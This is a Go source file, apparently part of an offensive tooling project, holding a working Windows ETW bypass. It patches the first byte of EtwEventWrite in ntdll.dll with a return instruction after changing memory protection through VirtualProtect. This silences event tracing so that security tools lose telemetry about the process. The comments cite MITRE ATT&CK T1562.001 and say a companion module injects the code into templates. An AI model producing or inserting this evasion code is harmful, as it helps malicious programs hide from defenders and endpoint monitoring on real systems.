//go:build windows
// +build windows

// ETW Bypass Snippet
// Reference: MITRE ATT&CK T1562.001 (Disable or Modify Tools)
//
// This snippet patches the EtwEventWrite function in ntdll.dll to immediately
// return, effectively disabling ETW (Event Tracing for Windows) for the
// current process. This prevents security tools from receiving telemetry
// about process behavior.
//
// Usage: Call bypassETW() early in execution to disable ETW tracing.
//
// Note: This file is a standalone snippet for reference. The evasion.py
// module generates this code dynamically for template injection.

package main

import (
	"syscall"
	"unsafe"
)

// bypassETW patches EtwEventWrite to disable ETW tracing.
// Reference: MITRE ATT&CK T1562.001 (Disable or Modify Tools)
func bypassETW() error {
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return err // Silent failure, continue execution
	}
	defer ntdll.Release()

	etwEventWrite, err := ntdll.FindProc("EtwEventWrite")
	if err != nil {
		return err
	}

	addr := etwEventWrite.Addr()
	// Patch byte: ret (0xC3) - immediately return from function
	patch := []byte{0xC3}

	var oldProtect uint32
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualProtect := kernel32.MustFindProc("VirtualProtect")

	// PAGE_EXECUTE_READWRITE = 0x40
	VirtualProtect.Call(addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	*(*byte)(unsafe.Pointer(addr)) = patch[0]
	// Restore original protection
	VirtualProtect.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	return nil
}
